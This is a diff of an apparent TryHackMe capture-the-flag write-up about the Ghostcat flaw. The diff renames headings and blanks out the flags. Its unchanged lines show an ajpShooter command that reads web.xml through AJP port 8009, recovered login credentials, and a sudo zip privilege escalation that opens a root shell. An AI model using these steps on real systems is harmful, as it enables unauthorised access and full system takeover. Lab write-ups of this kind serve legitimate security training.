@@ -8,7 +8,7 @@
 
 ## Enumeration
 
-- Nmap Initial
+### Nmap
 
 1. 22/ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
 2. 53/tcpwrapped
@@ -75,7 +75,7 @@ $ python ajpShooter.py http://$IP 8009 /WEB-INF/web.xml read
 
 ```
 
-## Get User Access
+## User Access
 
 - Get account credential
   `skyfuck:8730281lkjlkjdqlksalks`
@@ -117,7 +117,7 @@ User merlin may run the following commands on ubuntu:
 
 - merlin has sudo access to zip file without password
 
-## Get Root Access
+## Root Access
 
 - from gtfobin for zip
 
@@ -130,9 +130,9 @@ sudo zip $TF /etc/hosts -T -TT 'sh #'
 
 ```sh
 root@ubuntu:/# cat /home/merlin/user.txt
-THM{GhostCat_1s_so_cr4sy}
+...
 root@ubuntu:/# cat /root/root.txt
-THM{Z1P_1S_FAKE}
+...
 ```
 
 ---
